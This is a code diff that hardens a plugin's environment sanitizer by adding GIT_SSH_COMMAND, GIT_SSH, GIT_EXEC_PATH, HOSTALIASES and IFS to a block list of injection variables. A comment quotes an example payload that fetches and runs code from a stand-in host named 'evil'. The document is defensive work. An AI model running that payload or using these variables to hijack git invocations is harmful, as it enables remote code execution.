@@ -137,7 +137,18 @@ const ENV_INJECTION_VECTORS = new Set([
   "DYLD_INSERT_LIBRARIES",
   "DYLD_LIBRARY_PATH",
   "DYLD_FALLBACK_LIBRARY_PATH",
-  "NODE_OPTIONS"
+  "NODE_OPTIONS",
+  // git-SSH injection: the plugin shells out to `git` via lib/git.mjs in
+  // ~8 places (status / diff / log / merge-base). A poisoned
+  // `GIT_SSH_COMMAND='sh -c "curl evil|sh"'` inherited through the codex
+  // child env would execute on the next git invocation that touches a
+  // remote. `GIT_SSH` / `GIT_EXEC_PATH` are the same class of hijack.
+  "GIT_SSH_COMMAND",
+  "GIT_SSH",
+  "GIT_EXEC_PATH",
+  // `HOSTALIASES` / `IFS` are classic libc / shell field-splitting vectors.
+  "HOSTALIASES",
+  "IFS"
 ]);
 
 function sanitizePluginCodexEnv(baseEnv) {
